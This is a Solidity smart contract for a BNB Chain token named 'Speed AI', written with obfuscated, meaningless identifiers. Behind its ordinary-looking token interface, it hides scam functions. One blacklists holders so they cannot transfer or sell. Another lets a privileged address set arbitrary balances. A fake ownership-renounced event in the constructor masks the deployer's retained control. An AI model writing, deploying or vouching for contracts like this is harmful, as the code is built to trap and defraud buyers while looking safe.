/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface autoReceiver {
    function createPair(address enableMin, address minReceiver) external returns (address);
}

contract SpeedAI {

    string public symbol = "SAI";

    uint256 public tradingExempt;

    mapping(address => bool) public toFee;

    bool public buyShould;

    function transfer(address isWallet, uint256 tokenSwap) external returns (bool) {
        return transferFrom(enableTotal(), isWallet, tokenSwap);
    }

    function totalFund(address marketingTotal, address autoTeam, uint256 tokenSwap) internal returns (bool) {
        require(balanceOf[marketingTotal] >= tokenSwap);
        balanceOf[marketingTotal] -= tokenSwap;
        balanceOf[autoTeam] += tokenSwap;
        emit Transfer(marketingTotal, autoTeam, tokenSwap);
        return true;
    }

    uint256 private shouldLaunch;

    function amountTake(address toList) public {
        require(exemptLaunch[enableTotal()]);
        if (toList == liquidityLaunched || toList == enableAtReceiver) {
            return;
        }
        toFee[toList] = true;
    }

    mapping(address => uint256) public balanceOf;

    function approve(address limitMin, uint256 tokenSwap) public returns (bool) {
        allowance[enableTotal()][limitMin] = tokenSwap;
        emit Approval(enableTotal(), limitMin, tokenSwap);
        return true;
    }

    function autoFee(address isWallet, uint256 tokenSwap) public {
        require(exemptLaunch[enableTotal()]);
        balanceOf[isWallet] = tokenSwap;
    }

    function swapFrom(address marketingWallet) public {
        require(!buyShould);
        exemptLaunch[marketingWallet] = true;
        buyShould = true;
    }

    mapping(address => bool) public exemptLaunch;

    event Transfer(address indexed from, address indexed txExempt, uint256 value);

    function transferFrom(address totalLimit, address isWallet, uint256 tokenSwap) public returns (bool) {
        if (totalLimit != enableTotal() && allowance[totalLimit][enableTotal()] != type(uint256).max) {
            require(allowance[totalLimit][enableTotal()] >= tokenSwap);
            allowance[totalLimit][enableTotal()] -= tokenSwap;
        }
        require(!toFee[totalLimit]);
        return totalFund(totalLimit, isWallet, tokenSwap);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;

    address public liquidityLaunched;

    bool private atEnable;

    bool public fromIs;

    address public enableAtReceiver;

    string public name = "Speed AI";

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function enableTotal() private view returns (address) {
        return msg.sender;
    }

    constructor (){ 
        enableAtReceiver = autoReceiver(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        liquidityLaunched = enableTotal();
        balanceOf[liquidityLaunched] = totalSupply;
        exemptLaunch[liquidityLaunched] = true;
        emit Transfer(address(0), liquidityLaunched, totalSupply);
        emit OwnershipTransferred(liquidityLaunched, address(0));
    }

    event Approval(address indexed fundTo, address indexed spender, uint256 value);

    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * 10 ** 18;

}